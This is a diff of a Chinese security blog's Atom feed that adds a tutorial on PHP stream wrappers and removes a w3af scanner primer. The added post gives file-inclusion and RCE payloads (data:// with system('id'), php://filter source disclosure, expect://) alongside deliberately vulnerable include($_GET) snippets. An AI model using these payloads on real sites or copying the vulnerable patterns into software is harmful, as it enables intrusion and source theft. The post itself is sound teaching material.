@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2017-04-03T13:34:26.487Z</updated>
+  <updated>2017-04-09T05:07:41.995Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -14,6 +14,213 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>PHP伪协议</title>
+    <link href="http://yoursite.com/%E4%BB%A3%E7%A0%81/2017/04/09/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE.html"/>
+    <id>http://yoursite.com/代码/2017/04/09/PHP伪协议.html</id>
+    <published>2017-04-09T04:38:31.000Z</published>
+    <updated>2017-04-09T05:07:41.995Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="PHP协议-封装协议"><a href="#PHP协议-封装协议" class="headerlink" title="PHP协议/封装协议"></a>PHP协议/封装协议</h3><table>
+<thead>
+<tr>
+<th>包装或协议</th>
+<th style="text-align:center">控制能力</th>
+<th style="text-align:right">allow_url_include</th>
+<th style="text-align:right">漏洞类型</th>
+<th style="text-align:right">备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>file://</td>
+<td style="text-align:center">-</td>
+<td style="text-align:right">Off</td>
+<td style="text-align:right">LFI /文件操作</td>
+</tr>
+<tr>
+<td>glob://</td>
+<td style="text-align:center">-</td>
+<td style="text-align:right">Off</td>
+<td style="text-align:right">目录遍历</td>
+</tr>
+<tr>
+<td>php://filter/read</td>
+<td style="text-align:center">include</td>
+<td style="text-align:right">Off</td>
+<td style="text-align:right">文件泄露</td>
+<td style="text-align:right">PHP：//filter/read=convert.base64-encode/resource=index.php</td>
+</tr>
+<tr>
+<td>php://filter/write</td>
+<td style="text-align:center">file_put_contents</td>
+<td style="text-align:right">Off</td>
+<td style="text-align:right">编码</td>
+<td style="text-align:right">file_put_contents(“php://filter/write=string.rot13/resource=x.txt”,”content”);</td>
+</tr>
+<tr>
+<td>php://input</td>
+<td style="text-align:center">include</td>
+<td style="text-align:right">On</td>
+<td style="text-align:right">RCE</td>
+<td style="text-align:right">Encoding is required while reading .php source: &lt;?php echo base64_encode(file_get_contents(“solution.php”));?&gt; OR just use &lt;?php system(‘cat x.php’);?&gt;</td>
+</tr>
+<tr>
+<td>data://</td>
+<td style="text-align:center">include</td>
+<td style="text-align:right">On</td>
+<td style="text-align:right">RCE</td>
+<td style="text-align:right">data:text/plain,&lt;?php system(“id”)?&gt; OR data:text/plain;base64,PD9waHAgc3lzdGVtKCJpZCIpPz4=</td>
+</tr>
+<tr>
+<td>zip://</td>
+<td style="text-align:center">include + uploaded file</td>
+<td style="text-align:right">Off</td>
+<td style="text-align:right">RCE</td>
+</tr>
+<tr>
+<td>phar://</td>
+<td style="text-align:center">include + uploaded file</td>
+<td style="text-align:right">Off</td>
+<td style="text-align:right">RCE</td>
+<td style="text-align:right">PHP版本&gt; = 5.3</td>
+</tr>
+</tbody>
+</table>
+<a id="more"></a>
+<p>php中支持的伪协议</p>
+<pre><code>file:// — 访问本地文件系统
+http:// — 访问 HTTP(s) 网址
+ftp:// — 访问 FTP(s) URLs
+php:// — 访问各个输入/输出流（I/O streams）
+zlib:// — 压缩流
+data:// — 数据（RFC 2397）
+glob:// — 查找匹配的文件路径模式
+phar:// — PHP 归档
+ssh2:// — Secure Shell 2
+rar:// — RAR
+ogg:// — 音频流
+expect:// — 处理交互式的流
+</code></pre><p>这里可以参考<a href="http://php.net/manual/zh/wrappers.php" target="_blank" rel="external">官方文档</a>进行查看。而遇见最多的也就是php://协议了：</p>
+<ul>
+<li>php://stdin<br>主要用于php cli的输入</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">while($line = fopen(&apos;php://stdin&apos;,&apos;r&apos;))&#123;  </div><div class="line">    echo fgets($line);  </div><div class="line">&#125;  </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p><img src="http://i4.buimg.com/567571/f0b778051856c477.jpg" alt=""></p>
+<ul>
+<li>php://stdout<br>主要用于php cli的输入<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">$fh = fopen(&apos;php://stdout&apos;, &apos;w&apos;);  </div><div class="line">fwrite($fh, &quot;标准输出php://stdout\n&quot;);  </div><div class="line">fclose($fh);  </div><div class="line">fwrite(STDOUT, &quot;标准输出STDOUT\n&quot;);  </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="http://i4.buimg.com/567571/e62036bab64c514b.jpg" alt=""></p>
+<ul>
+<li>php://input<br>可以读取到post没有解析的原始数据<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line"> echo file_get_contents($_GET[&quot;a&quot;]);  </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="http://i4.buimg.com/567571/caba05f9460d9dbe.jpg" alt=""><br>当php代码换成<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">$code = $_GET[&apos;a&apos;];  </div><div class="line">include($code);  </div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
+<p>而且当php远程包含打开的时候（当allow_url_include=on),就可以造成任意代码执行。<br><img src="http://i4.buimg.com/567571/52bcb6ca96711975.jpg" alt=""></p>
+<ul>
+<li>php://output<br>是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line"> $code=$_GET[&quot;a&quot;];  </div><div class="line"> file_put_contents($code,&quot;test&quot;);   </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="http://i4.buimg.com/567571/ab8f21052b4e2890.jpg" alt=""></p>
+<ul>
+<li>php://filter<br>是一种元封装器， 设计用于数据流打开时的筛选过滤应用<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">$filename=$_GET[&quot;a&quot;];  </div><div class="line">$data=&quot;test&quot;;  </div><div class="line">file_put_contents($filename, $data);  </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>?a=php://filter/write=string.tolower/resource=test.php<br>可以往服务器中写入一个文件内容全为小写且文件名为test.php的文件：<br>其中 ：<br>（1）string.tolower //写入内容全部变成小写<br>（2）string.toupper //写入内容全部变成大写<br>（3）string.rot13 //写入内容全部对字符串执行 ROT13 编码<br>通过：?a=php://filter/convert.base64-encode/resource=test.php<br>可以往服务器中写入一个文件内容为base64编码且文件名为test.php的文件<br><img src="http://i2.muimg.com/567571/f80e4710de9ee31d.jpg" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">$filename=$_GET[&quot;a&quot;];  </div><div class="line">echo file_get_contents($filename);  </div><div class="line">?&gt; </div><div class="line"></div><div class="line">&lt;?php  </div><div class="line">$filename=$_GET[&quot;a&quot;]; </div><div class="line">include(&quot;$filename&quot;);  </div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
+<p>?a=php://filter/convert.base64-encode/resource=test.php,就可以把test.php的内容以base64编码的方式显示出来</p>
+<p>双引号包含的变量$filename，可以当成正常变量执行，而单引号包裹的变量则会当成字符串</p>
+<ul>
+<li>expect://<br>可以用这个协议执行任意linux的指令<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">$code = $_GET[&apos;hax&apos;];  </div><div class="line">include($code);  </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>那么可以用?hax=expect://command 来执行任意linux指令，但是：<br>Note:该封装协议默认未开启<br>为了使用 expect:// 封装器，你必须安装» PECL 上的 » Expect扩展。</p>
+<ul>
+<li>data://<br>数据流封装器<br>当allow_url_include 打开的时候，任意文件包含就会成为任意命令执行<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">$filename=$_GET[&quot;a&quot;];  </div><div class="line">include(&quot;$filename&quot;);  </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="http://i4.buimg.com/567571/19570d7acea8b8a7.jpg" alt=""></p>
+<p>参考链接：<br><a href="http://blog.csdn.net/niexinming/article/details/52605144" target="_blank" rel="external">http://blog.csdn.net/niexinming/article/details/52605144</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;PHP协议-封装协议&quot;&gt;&lt;a href=&quot;#PHP协议-封装协议&quot; class=&quot;headerlink&quot; title=&quot;PHP协议/封装协议&quot;&gt;&lt;/a&gt;PHP协议/封装协议&lt;/h3&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;包装或协议&lt;/th&gt;
+&lt;th style=&quot;text-align:center&quot;&gt;控制能力&lt;/th&gt;
+&lt;th style=&quot;text-align:right&quot;&gt;allow_url_include&lt;/th&gt;
+&lt;th style=&quot;text-align:right&quot;&gt;漏洞类型&lt;/th&gt;
+&lt;th style=&quot;text-align:right&quot;&gt;备注&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;file://&lt;/td&gt;
+&lt;td style=&quot;text-align:center&quot;&gt;-&lt;/td&gt;
+&lt;td style=&quot;text-align:right&quot;&gt;Off&lt;/td&gt;
+&lt;td style=&quot;text-align:right&quot;&gt;LFI /文件操作&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;glob://&lt;/td&gt;
+&lt;td style=&quot;text-align:center&quot;&gt;-&lt;/td&gt;
+&lt;td style=&quot;text-align:right&quot;&gt;Off&lt;/td&gt;
+&lt;td style=&quot;text-align:right&quot;&gt;目录遍历&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;php://filter/read&lt;/td&gt;
+&lt;td style=&quot;text-align:center&quot;&gt;include&lt;/td&gt;
+&lt;td style=&quot;text-align:right&quot;&gt;Off&lt;/td&gt;
+&lt;td style=&quot;text-align:right&quot;&gt;文件泄露&lt;/td&gt;
+&lt;td style=&quot;text-align:right&quot;&gt;PHP：//filter/read=convert.base64-encode/resource=index.php&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;php://filter/write&lt;/td&gt;
+&lt;td style=&quot;text-align:center&quot;&gt;file_put_contents&lt;/td&gt;
+&lt;td style=&quot;text-align:right&quot;&gt;Off&lt;/td&gt;
+&lt;td style=&quot;text-align:right&quot;&gt;编码&lt;/td&gt;
+&lt;td style=&quot;text-align:right&quot;&gt;file_put_contents(“php://filter/write=string.rot13/resource=x.txt”,”content”);&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;php://input&lt;/td&gt;
+&lt;td style=&quot;text-align:center&quot;&gt;include&lt;/td&gt;
+&lt;td style=&quot;text-align:right&quot;&gt;On&lt;/td&gt;
+&lt;td style=&quot;text-align:right&quot;&gt;RCE&lt;/td&gt;
+&lt;td style=&quot;text-align:right&quot;&gt;Encoding is required while reading .php source: &amp;lt;?php echo base64_encode(file_get_contents(“solution.php”));?&amp;gt; OR just use &amp;lt;?php system(‘cat x.php’);?&amp;gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;data://&lt;/td&gt;
+&lt;td style=&quot;text-align:center&quot;&gt;include&lt;/td&gt;
+&lt;td style=&quot;text-align:right&quot;&gt;On&lt;/td&gt;
+&lt;td style=&quot;text-align:right&quot;&gt;RCE&lt;/td&gt;
+&lt;td style=&quot;text-align:right&quot;&gt;data:text/plain,&amp;lt;?php system(“id”)?&amp;gt; OR data:text/plain;base64,PD9waHAgc3lzdGVtKCJpZCIpPz4=&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;zip://&lt;/td&gt;
+&lt;td style=&quot;text-align:center&quot;&gt;include + uploaded file&lt;/td&gt;
+&lt;td style=&quot;text-align:right&quot;&gt;Off&lt;/td&gt;
+&lt;td style=&quot;text-align:right&quot;&gt;RCE&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;phar://&lt;/td&gt;
+&lt;td style=&quot;text-align:center&quot;&gt;include + uploaded file&lt;/td&gt;
+&lt;td style=&quot;text-align:right&quot;&gt;Off&lt;/td&gt;
+&lt;td style=&quot;text-align:right&quot;&gt;RCE&lt;/td&gt;
+&lt;td style=&quot;text-align:right&quot;&gt;PHP版本&amp;gt; = 5.3&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+    
+    </summary>
+    
+      <category term="代码" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81/"/>
+    
+    
+      <category term="php" scheme="http://yoursite.com/tags/php/"/>
+    
+  </entry>
   
   <entry>
     <title>PhpMyadmin分析（二）</title>
@@ -1988,67 +2195,6 @@ action=login&amp;login_name=admin&amp;login_pass=123456&amp;code=8CAA&amp;Submit
       <category term="php" scheme="http://yoursite.com/tags/php/"/>
     
       <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>w3af初级</title>
-    <link href="http://yoursite.com/%E6%B8%97%E9%80%8F/2016/11/22/w3af%E5%88%9D%E7%BA%A7.html"/>
-    <id>http://yoursite.com/渗透/2016/11/22/w3af初级.html</id>
-    <published>2016-11-22T04:09:54.000Z</published>
-    <updated>2017-04-02T07:40:32.005Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="0x01-w3af"><a href="#0x01-w3af" class="headerlink" title="0x01 w3af"></a>0x01 w3af</h3><p>w3af是一个完整的web应用攻击和漏洞分析环境。该环境为web漏洞的分析和测试提供了一个课信赖的平台。<br>w3af是一个Web应用程序攻击和检查框架，该项目已超过130个插件，其中包括检查网站爬虫,SQL注入(SQL Injection),跨站(XSS),本地文件包含(LFI),远程文件包含(RFI)等<br><a id="more"></a></p>
-<h3 id="0x02-Linux下安装与启动"><a href="#0x02-Linux下安装与启动" class="headerlink" title="0x02 Linux下安装与启动"></a>0x02 Linux下安装与启动</h3><pre><code>apt-get install w3af   #安装
-cd +安装目录             #启动
-./w3af_console
-</code></pre><p><strong><em>补充一个小知识点：</em></strong><br>Linux下查看运行文件所在路径：<strong>which</strong><br>eg:which w3af<br>Linux下查看文件安装路径：<strong>whereis</strong><br>eg:whereis w3af<br><img src="http://obh1qcqek.bkt.clouddn.com/329.jpg" alt=""></p>
-<p>由于kali Linux自带有w3af，所以我们可以直接启动它，</p>
-<pre><code>w3af           #图形界面
-w3af_console   #控制台界面
-</code></pre><p><img src="http://obh1qcqek.bkt.clouddn.com/833.jpg" alt=""></p>
-<p><img src="http://obh1qcqek.bkt.clouddn.com/658.jpg" alt=""><br>推荐大家使用控制台界面</p>
-<h3 id="0x03-w3af基本插件"><a href="#0x03-w3af基本插件" class="headerlink" title="0x03 w3af基本插件"></a>0x03 w3af基本插件</h3><p>W3af主要有三种主要类型的插件：<br><strong>Discovery：</strong>抓取插件，主要负责寻找url，其实就是网络爬虫。<br><strong>Audit：</strong>审计插件，主要负责发现抓取插件爬取的url中是否存在安全漏洞。<br><strong>Attack：</strong>攻击插件，主要是去利用审计插件发现的漏洞。<br>其他插件：<br>discovery:漏洞挖掘<br>exploit: 漏洞利用<br>Infrastructure：确定目标的基本信息，如安装的waf、操作系统等。<br>Grep：分析其他插件发送的HTTP请求和响应，并确定漏洞。<br>Output：输出插件，可以将数据保存到文本文件、XML文件或HTML文件。<br>Mangle：允许以基于正则表达式的方式修改网络请求和响应。<br>Bruteforce：进行暴力破解登录信息<br>Evasion：用于逃避简单的入侵检测。</p>
-<p>首先我们查看帮助信息，有利于我们了解它的操作使用<br><img src="http://obh1qcqek.bkt.clouddn.com/391.jpg" alt=""></p>
-<h3 id="0x04-w3af基本原理和使用"><a href="#0x04-w3af基本原理和使用" class="headerlink" title="0x04 w3af基本原理和使用"></a>0x04 w3af基本原理和使用</h3><h4 id="1、基本原理"><a href="#1、基本原理" class="headerlink" title="1、基本原理"></a>1、基本原理</h4><p>1.1 <strong>漏洞挖掘(Discovery)</strong><br>搜寻新的URL、表单和其他注入点，使用Crawl抓取插件进行漏洞挖掘。Web spider是一个经典的漏洞挖掘插件。这个插件以一个URL为输入，然后得到一个或多个注入点。当用户使用多个这种类型的插件时，这些插件会运行这样的循环：如果插件A在第一次运行时发现了一个新的URL，w3af内核将这个URL传递给插件B。如果插件B发现了一个新的URL，也将发送给A。这个过程将一直持续下去，所有的插件都将会工作。占用应用资源，直到无法运行漏洞挖掘应用。<br>1.2 <strong>漏洞分析(Audit)</strong><br>分析那些有漏洞挖掘插件找到的注入点，为了发现漏洞，漏洞分析插件会向所有可注入点发送他别设计好的数据。例如使用一个漏洞分析插件来获取SQL注入的漏洞<br>1.3 <strong>漏洞攻击(Attack)</strong><br>利用分析插件发现的漏洞。他们通常会得到一个远程服务器的shell或者一个利用SQL注入漏洞获取的远程数据库表。</p>
-<h4 id="2、基本使用"><a href="#2、基本使用" class="headerlink" title="2、基本使用"></a>2、基本使用</h4><p>2.1 <strong>插件配置</strong><br>plugins，遇到问题都可以使用help查看帮助<br><img src="http://obh1qcqek.bkt.clouddn.com/4146.jpg" alt=""></p>
-<pre><code>w3af&gt;&gt;&gt; plugins    #进入插件模块
-w3af/plugins&gt;&gt;&gt; list crawl   #列出所有用于发现的插件
-w3af/plugins&gt;&gt;&gt; crawl find_backdoors phpinfo web_spider      //启用这三个扫描插件插件
-w3af/plugins&gt;&gt;&gt; list audit    #列出所有用于漏洞的插件
-w3af/plugins&gt;&gt;&gt; audit blindSqli fileUpload osCommanding sqli xss     #启用blindSqli fileUpload osCommanding sqli xss这五个插件
-w3af/plugins&gt;&gt;&gt; back    #返回主模块
-</code></pre><p>查看某一插件内部信息</p>
-<pre><code>w3af/plugins&gt;&gt;&gt;audit desc xss  #了解插件作用
-w3af/plugins&gt;&gt;&gt;audit config xss
-w3af/plugins/audit/config:xss&gt;&gt;&gt;view
-</code></pre><p><img src="http://obh1qcqek.bkt.clouddn.com/825.jpg" alt=""></p>
-<p>2.2 <strong>漏洞扫描</strong><br>设置扫描目标,自己本地搭建环境进行测试</p>
-<pre><code>w3af&gt;&gt;&gt; target    #进入配置目标的模块
-w3af/config:target&gt;&gt;&gt; set target http://192.168.1.105/sqli-labs/Less-1/ #设置攻击目标
-w3af/config:target&gt;&gt;&gt; back
-w3af&gt;&gt;&gt; start     #开始扫描
-</code></pre><p><img src="http://obh1qcqek.bkt.clouddn.com/257.jpg" alt=""><br>2.3 <strong>漏洞利用</strong><br>使用扫描出的漏洞进行攻击</p>
-<pre><code>w3af&gt;&gt;&gt; exploit    #进入漏洞利用模块
-w3af/exploit&gt;&gt;&gt; list exploit    #列出所有用于漏洞利用的插件
-w3af/exploit&gt;&gt;&gt; exploit sqlmap  #选择sqlmap进行利用
-</code></pre><p><img src="http://obh1qcqek.bkt.clouddn.com/786.jpg" alt=""><br>他可以和sqlmap进行联动,发现存在sql注入</p>
-<pre><code>w3af/exploit&gt;&gt;&gt; interact 0  #获得交换式模块
-w3af/exploit/sqlmap-0&gt;&gt;&gt; dbs #获得数据库名
-</code></pre><p>其实w3af还有好多的功能和用处，功能还不错，这里只是简单的介绍了他的初级使用，大家有兴趣的话可以继续研究下去。</p>
-<p><img src="http://obh1qcqek.bkt.clouddn.com/785.jpg" alt=""></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h3 id=&quot;0x01-w3af&quot;&gt;&lt;a href=&quot;#0x01-w3af&quot; class=&quot;headerlink&quot; title=&quot;0x01 w3af&quot;&gt;&lt;/a&gt;0x01 w3af&lt;/h3&gt;&lt;p&gt;w3af是一个完整的web应用攻击和漏洞分析环境。该环境为web漏洞的分析和测试提供了一个课信赖的平台。&lt;br&gt;w3af是一个Web应用程序攻击和检查框架，该项目已超过130个插件，其中包括检查网站爬虫,SQL注入(SQL Injection),跨站(XSS),本地文件包含(LFI),远程文件包含(RFI)等&lt;br&gt;
-    
-    </summary>
-    
-      <category term="渗透" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"/>
-    
-    
-      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
     
   </entry>
   
